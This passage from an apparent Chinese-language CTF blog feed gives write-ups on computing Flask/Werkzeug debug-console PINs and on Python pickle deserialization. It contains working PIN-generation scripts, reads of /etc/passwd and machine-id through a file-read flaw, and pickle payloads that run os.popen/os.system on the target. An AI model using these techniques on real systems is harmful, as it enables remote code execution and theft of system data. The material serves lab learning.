class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#MD5</span><br><span class="line">import hashlib</span><br><span class="line">from itertools import chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">     &#x27;flaskweb&#x27;# username</span><br><span class="line">     &#x27;flask.app&#x27;,# modname</span><br><span class="line">     &#x27;Flask&#x27;,# getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span><br><span class="line">     &#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27; # getattr(mod, &#x27;__file__&#x27;, None),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">     &#x27;25214234362297&#x27;,# str(uuid.getnode()),  /sys/class/net/ens33/address</span><br><span class="line">     &#x27;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#x27;# get_machine_id(), /etc/machine-id</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line">for bit in chain(probably_public_bits, private_bits):</span><br><span class="line">    if not bit:</span><br><span class="line">        continue</span><br><span class="line">    if isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(&#x27;utf-8&#x27;)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(b&#x27;cookiesalt&#x27;)</span><br><span class="line"></span><br><span class="line">cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]</span><br><span class="line"></span><br><span class="line">num = None</span><br><span class="line">if num is None:</span><br><span class="line">   h.update(b&#x27;pinsalt&#x27;)</span><br><span class="line">   num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]</span><br><span class="line"></span><br><span class="line">rv =None</span><br><span class="line">if rv is None:</span><br><span class="line">   for group_size in 5, 4, 3:</span><br><span class="line">       if len(num) % group_size == 0:</span><br><span class="line">          rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;)</span><br><span class="line">                      for x in range(0, len(num), group_size))</span><br><span class="line">          break</span><br><span class="line">       else:</span><br><span class="line">          rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>python3.8</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">#sha1</span><br><span class="line">import hashlib</span><br><span class="line">from itertools import chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    &#x27;root&#x27;# /etc/passwd</span><br><span class="line">    &#x27;flask.app&#x27;,# 默认值</span><br><span class="line">    &#x27;Flask&#x27;,# 默认值</span><br><span class="line">    &#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27; # 报错得到</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    &#x27;2485377581187&#x27;,#  /sys/class/net/eth0/address 16进制转10进制</span><br><span class="line">    #machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span><br><span class="line">    &#x27;653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd&#x27;#  /proc/self/cgroup</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line">for bit in chain(probably_public_bits, private_bits):</span><br><span class="line">    if not bit:</span><br><span class="line">        continue</span><br><span class="line">    if isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(&#x27;utf-8&#x27;)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(b&#x27;cookiesalt&#x27;)</span><br><span class="line"></span><br><span class="line">cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]</span><br><span class="line"></span><br><span class="line">num = None</span><br><span class="line">if num is None:</span><br><span class="line">    h.update(b&#x27;pinsalt&#x27;)</span><br><span class="line">    num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]</span><br><span class="line"></span><br><span class="line">rv =None</span><br><span class="line">if rv is None:</span><br><span class="line">    for group_size in 5, 4, 3:</span><br><span class="line">        if len(num) % group_size == 0:</span><br><span class="line">            rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;)</span><br><span class="line">                          for x in range(0, len(num), group_size))</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据上述的信息，我们要先获得正确的pin码，那就一个个来吧</p><p>1.<strong>确定python版本</strong></p><p>python版本为3.5</p><p>2.<strong>确定flask的存储位置</strong></p><p>根据实例报错可知路径为&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.5&#x2F;site-packages&#x2F;flask&#x2F;app.py</p><p>3.<strong>获取username</strong></p><p>根据源代码可知，root下面有个file路径可以访问其他文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入：/file?filename=/etc/passwd</span><br></pre></td></tr></table></figure><p>username为root</p><p>4.<strong>获取uuidnode</strong></p><p>&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</p><p>得到uuidnode的十六进制为：02:42:ac:02:1f:fc</p><p>我们需要将其转化为10进制：2485376917500</p><p>5.<strong>获取machine_id</strong></p><p>访问&#x2F;etc&#x2F;machine-id</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c31eea55a29431535ff01de94bdcf5cf</span><br></pre></td></tr></table></figure><p>访问&#x2F;proc&#x2F;self&#x2F;cgroup</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">27f9f599813e5072c65483b50b8e6174b44d216d88028c399feb87c8c4eed31e</span><br></pre></td></tr></table></figure><p>6.<strong>运行脚本获取pin码</strong></p><p>7.进入console路由</p><p>输入pin码后进入调试模式</p><p>8.控制台导入os模块，运行语句，获取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">os.popen(&#x27;ls&#x27;).read()</span><br><span class="line">os.popen(&#x27;ls /&#x27;).read()</span><br><span class="line">os.popen(&#x27;cat /flaggggg&#x27;).read()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;flask-pin&quot;&gt;&lt;a href=&quot;#flask-pin&quot; class=&quot;headerlink&quot; title=&quot;flask_pin&quot;&gt;&lt;/a&gt;flask_pin&lt;/h1&gt;&lt;h2 id=&quot;1-什么是pin码&quot;&gt;&lt;a href=&quot;#1-什么是pin码&quot; class</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>pickle反序列化</title>
    <link href="http://1768161086.github,io/2025/03/29/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://1768161086.github,io/2025/03/29/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2025-03-29T02:53:34.000Z</published>
    <updated>2025-05-23T10:05:14.595Z</updated>
    
    <content type="html"><![CDATA[<h2 id="polar-unpickle"><a href="#polar-unpickle" class="headerlink" title="polar_unpickle"></a>polar_unpickle</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line">from flask import Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&quot;/&quot;)</span><br><span class="line">def index():</span><br><span class="line">    try:</span><br><span class="line">        user = base64.b64decode(request.cookies.get(&#x27;user&#x27;))</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        return user</span><br><span class="line">    except:</span><br><span class="line">        username = &quot;Guest&quot;</span><br><span class="line"></span><br><span class="line">    return &quot;Hello %s&quot; % username</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(host=&quot;0.0.0.0&quot;, port=8080)</span><br></pre></td></tr></table></figure><p>1.根据上述的分析，pickle反序列化使用cookies传入</p><p>2.可以编写一段先base64编码再序列化的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">import requests</span><br><span class="line">import pickle</span><br><span class="line">import os</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class exp(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (eval,(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;,))//利用os.popen查询</span><br><span class="line">#这里的语句也可以换成return (eval, (&quot;open(&#x27;/flag&#x27;).read()&quot;,))，也可以利用反弹语句获取shell，但这个实例好像不能使用反弹获取shell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = exp()</span><br><span class="line">s = pickle.dumps(e)//将获取的对象序列化</span><br><span class="line">user = base64.b64encode(s).decode()//将序列化的对象使用base64加密</span><br><span class="line">print(user)//输出加密后的序列化对象</span><br><span class="line"></span><br><span class="line">response = requests.get(&quot;URL&quot;, cookies=dict(</span><br><span class="line">    user=base64.b64encode(s).decode()</span><br><span class="line">))</span><br><span class="line">print(response.content)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="moectf2024-PetStore"><a href="#moectf2024-PetStore" class="headerlink" title="moectf2024-PetStore"></a>moectf2024-PetStore</h2><p>喵喵把 flag 丢在宠物商店了，帮她找回 flag 吧！</p><ul><li><p>将根据解题情况逐步发放新的 hint。</p></li><li><p>有任何疑问可通过锤子提问。</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, request, jsonify, render_template, redirect</span><br><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line">import uuid</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">class Pet:</span><br><span class="line">    def __init__(self, name, species) -&gt; None:</span><br><span class="line">        self.name = name</span><br><span class="line">        self.species = species</span><br><span class="line">        self.uuid = uuid.uuid4()</span><br><span class="line"></span><br><span class="line">    def __repr__(self) -&gt; str:</span><br><span class="line">        return f&quot;Pet(name=&#123;self.name&#125;, species=&#123;self.species&#125;, uuid=&#123;self.uuid&#125;)&quot;</span><br><span class="line"></span><br><span class="line">class PetStore:</span><br><span class="line">    def __init__(self) -&gt; None:</span><br><span class="line">        self.pets = []</span><br><span class="line"></span><br><span class="line">    def create_pet(self, name, species) -&gt; None:</span><br><span class="line">        pet = Pet(name, species)</span><br><span class="line">        self.pets.append(pet)</span><br><span class="line"></span><br><span class="line">    def get_pet(self, pet_uuid) -&gt; Pet | None:</span><br><span class="line">        for pet in self.pets:</span><br><span class="line">            if str(pet.uuid) == pet_uuid:</span><br><span class="line">                return pet</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line">    def export_pet(self, pet_uuid) -&gt; str | None:</span><br><span class="line">        pet = self.get_pet(pet_uuid)</span><br><span class="line">        if pet is not None:</span><br><span class="line">            self.pets.remove(pet)</span><br><span class="line">            serialized_pet = base64.b64encode(pickle.dumps(pet)).decode(&quot;utf-8&quot;)</span><br><span class="line">            return serialized_pet</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line">    def import_pet(self, serialized_pet) -&gt; bool:</span><br><span class="line">        try:</span><br><span class="line">            print(111111)</span><br><span class="line">            pet_data = base64.b64decode(serialized_pet)</span><br><span class="line">            pet = pickle.loads(pet_data)</span><br><span class="line">            if isinstance(pet, Pet):</span><br><span class="line">                for i in self.pets:</span><br><span class="line">                    if i.uuid == pet.uuid:</span><br><span class="line">                        return False</span><br><span class="line">                self.pets.append(pet)</span><br><span class="line">                return True</span><br><span class="line">            return False</span><br><span class="line">        except Exception:</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">store = PetStore()</span><br><span class="line"></span><br><span class="line">@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])</span><br><span class="line">def index():</span><br><span class="line">    pets = store.pets</span><br><span class="line">    return render_template(&quot;index.html&quot;, pets=pets)</span><br><span class="line"></span><br><span class="line">@app.route(&quot;/create&quot;, methods=[&quot;POST&quot;])</span><br><span class="line">def create_pet():</span><br><span class="line">    name = request.form[&quot;name&quot;]</span><br><span class="line">    species = request.form[&quot;species&quot;]</span><br><span class="line">    store.create_pet(name, species)</span><br><span class="line">    return redirect(&quot;/&quot;)</span><br><span class="line"></span><br><span class="line">@app.route(&quot;/get&quot;, methods=[&quot;POST&quot;])</span><br><span class="line">def get_pet():</span><br><span class="line">    pet_uuid = request.form[&quot;uuid&quot;]</span><br><span class="line">    pet = store.get_pet(pet_uuid)</span><br><span class="line">    if pet is not None:</span><br><span class="line">        return jsonify(&#123;&quot;name&quot;: pet.name, &quot;species&quot;: pet.species, &quot;uuid&quot;: pet.uuid&#125;)</span><br><span class="line">    else:</span><br><span class="line">        return jsonify(&#123;&quot;error&quot;: &quot;Pet not found&quot;&#125;)</span><br><span class="line"></span><br><span class="line">@app.route(&quot;/export&quot;, methods=[&quot;POST&quot;])</span><br><span class="line">def export_pet():</span><br><span class="line">    pet_uuid = request.form[&quot;uuid&quot;]</span><br><span class="line">    serialized_pet = store.export_pet(pet_uuid)</span><br><span class="line">    if serialized_pet is not None:</span><br><span class="line">        return jsonify(&#123;&quot;serialized_pet&quot;: serialized_pet&#125;)</span><br><span class="line">    else:</span><br><span class="line">        return jsonify(&#123;&quot;error&quot;: &quot;Pet not found&quot;&#125;)</span><br><span class="line"></span><br><span class="line">@app.route(&quot;/import&quot;, methods=[&quot;POST&quot;])</span><br><span class="line">def import_pet():</span><br><span class="line">    serialized_pet = request.form[&quot;serialized_pet&quot;]</span><br><span class="line">    if store.import_pet(serialized_pet):</span><br><span class="line">        return redirect(&quot;/&quot;)</span><br><span class="line">    else:</span><br><span class="line">        return jsonify(&#123;&quot;error&quot;: &quot;Failed to import pet&quot;&#125;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(host=&quot;0.0.0.0&quot;, port=8889, debug=False, threaded=True)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这题就比较简单了，虽然有个<code>isinstance</code>验证，但<code>pickle.loads</code>反序列化在其之前，相当于没有任何过滤，只是没有回显</p><p>题目也说了不能出网，问题不大，我们可以执行命令写到static目录(需要mkdir一个)下，然后读取文件</p><p>1.先写一个opcode脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import pickle,pickletools</span><br><span class="line">import base64</span><br><span class="line">opcode = b&#x27;&#x27;&#x27;cos</span><br><span class="line">system</span><br><span class="line">(S&#x27;mkdir static &amp;&amp; set &gt; ./static/1&#x27;</span><br><span class="line">tR.</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">pickletools.dis(opcode)</span><br><span class="line">print(base64.b64encode(opcode).decode())</span><br><span class="line">#Y29zCnN5c3RlbQooUydta2RpciBzdGF0aWMgJiYgc2V0ID4gLi9zdGF0aWMvMScKdFIuCg==</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2.传入Serialized Pet Data (base64)中</p><p>3.访问<code>/static/1</code>路由，拿到环境变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">BB_ASH_VERSION=&#x27;1.36.1&#x27;</span><br><span class="line">FLAG=&#x27;moectf&#123;sTaRRyMEow&#x27;&quot;&#x27;&quot;&#x27;S_FIag_hA5_Be3n-aCC3Pted-AcaC@cAc16&#125;&#x27;</span><br><span class="line">FUNCNAME=&#x27;&#x27;</span><br><span class="line">GPG_KEY=&#x27;7169605F62C751356D054A26A821E680E5FA6305&#x27;</span><br><span class="line">HOME=&#x27;/root&#x27;</span><br><span class="line">HOSTNAME=&#x27;ret2shell-109-13622-1747994255&#x27;</span><br><span class="line">IFS=&#x27; </span><br><span class="line">&#x27;</span><br><span class="line">KUBERNETES_PORT=&#x27;tcp://10.43.0.1:443&#x27;</span><br><span class="line">KUBERNETES_PORT_443_TCP=&#x27;tcp://10.43.0.1:443&#x27;</span><br><span class="line">KUBERNETES_PORT_443_TCP_ADDR=&#x27;10.43.0.1&#x27;</span><br><span class="line">KUBERNETES_PORT_443_TCP_PORT=&#x27;443&#x27;</span><br><span class="line">KUBERNETES_PORT_443_TCP_PROTO=&#x27;tcp&#x27;</span><br><span class="line">KUBERNETES_SERVICE_HOST=&#x27;10.43.0.1&#x27;</span><br><span class="line">KUBERNETES_SERVICE_PORT=&#x27;443&#x27;</span><br><span class="line">KUBERNETES_SERVICE_PORT_HTTPS=&#x27;443&#x27;</span><br><span class="line">LANG=&#x27;C.UTF-8&#x27;</span><br><span class="line">LINENO=&#x27;&#x27;</span><br><span class="line">OPTIND=&#x27;1&#x27;</span><br><span class="line">PATH=&#x27;/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#x27;</span><br><span class="line">PPID=&#x27;1&#x27;</span><br><span class="line">PS1=&#x27;\w \$ &#x27;</span><br><span class="line">PS2=&#x27;&gt; &#x27;</span><br><span class="line">PS4=&#x27;+ &#x27;</span><br><span class="line">PWD=&#x27;/&#x27;</span><br><span class="line">PYTHONUNBUFFERED=&#x27;1&#x27;</span><br><span class="line">PYTHON_GET_PIP_SHA256=&#x27;6fb7b781206356f45ad79efbb19322caa6c2a5ad39092d0d44d0fec94117e118&#x27;</span><br><span class="line">PYTHON_GET_PIP_URL=&#x27;https://github.com/pypa/get-pip/raw/66d8a0f637083e2c3ddffc0cb1e65ce126afb856/public/get-pip.py&#x27;</span><br><span class="line">PYTHON_PIP_VERSION=&#x27;24.0&#x27;</span><br><span class="line">PYTHON_VERSION=&#x27;3.12.4&#x27;</span><br><span class="line">SHLVL=&#x27;1&#x27;</span><br><span class="line">WERKZEUG_SERVER_FD=&#x27;3&#x27;</span><br></pre></td></tr></table></figure><p>4.有意思的是，<code>moectf&#123;sT@RRyMEow&#39;&quot;&#39;&quot;&#39;5-flaG_hAs_be3N-aCCEptEd-@C@c4C@c22&#125;</code>并不是flag，其中有<code>&#39;</code>闭合的问题</p><p>5.执行echo $FLAG &gt; .&#x2F;static&#x2F;1也可</p><p><img src="https://img-blog.csdnimg.cn/img_convert/faaa61d417e37ad58b3c09e637ab49e4.png" alt="image-20240910135747024"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;polar-unpickle&quot;&gt;&lt;a href=&quot;#polar-unpickle&quot; class=&quot;headerlink&quot; title=&quot;polar_unpickle&quot;&gt;&lt;/a&gt;polar_unpickle&lt;/h2&gt;&lt;figure class=&quot;highlight </summary>
      
    
    
    
    
  </entry>
  
</feed>
